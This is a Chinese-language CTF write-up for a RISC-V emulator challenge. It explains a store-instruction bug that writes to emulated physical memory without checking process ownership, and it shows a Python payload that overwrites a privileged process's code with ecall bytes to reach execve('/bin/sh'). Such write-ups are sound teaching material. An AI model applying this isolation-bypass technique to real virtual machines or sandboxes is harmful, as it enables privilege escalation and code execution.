# evm

## 题目简述

题目模拟了一个 RISC-V 虚拟机，并同时维护普通进程和特权进程。普通进程输入受限，特权进程可以执行 `syscall`。附件只提供 `evm` 二进制和 IDA 数据库，官方 exp 构造 RISC-V 指令写入特权进程代码区。

灵感来自 RISC-V “ghost write” 类问题：某些寻址错误地使用物理地址而非虚拟地址，导致绕过页表隔离。

## 解题过程

### 关键机制

漏洞点在 store 指令。正常访存应经过页表转换，但题目还实现了直接写模拟物理内存的路径：

```cpp
addr = register_file[rs1] + imm;
true_addr = (void *)(addr + (uint64_t)data_memory);
if (addr >= PAGENUM * PAGESIZE) {
    _Exit(1);
}
*(uint64_t *)true_addr = value;
```

这里仅检查 `addr` 是否在模拟物理内存范围内，没有检查它属于当前普通进程。普通进程可通过物理地址写到特权进程代码区，把受限指令区改成 `syscall`。

### 求解步骤

exp 先用 RISC-V 编码辅助函数生成 `addi`、`slli`、`xor`、store、branch 等指令，再在循环中把 `0x73` 写入目标页。`0x73` 是 RISC-V `ecall/syscall` 指令编码。

核心 payload 逻辑：

```python
payload = (
    p32(0x13) * 4
    + reg_xor(0, 0, 0)
    + reg_xor(1, 1, 1)
    + reg_xor(2, 2, 2)
    + reg_xor(3, 3, 3)
    + addi(2, 2, 511)
    + addi(1, 1, 0x73)
    + addi(0, 0, 0x1000 // 2)
    + addi(0, 0, 0x1000 // 2)
    + store_memory(0, 1, 0, 3)
    + addi(3, 3, 1)
    + blt(3, 2, -4 * 5)
    + reg_xor(10, 10, 10)
    + addi(10, 10, 0x3B)
)
```

写入完成后再次触发特权进程执行被修改的位置，进入 syscall 路径，最后设置寄存器完成 `execve("/bin/sh", ...)` 或等价命令执行。

## 方法总结

- 漏洞本质：虚拟地址隔离和物理内存访问路径混用。
- 利用目标：普通进程通过 store 修改特权进程代码页。
- 关键指令：`0x73` 即 RISC-V `ecall`，是从普通指令集逃到 syscall 的入口。
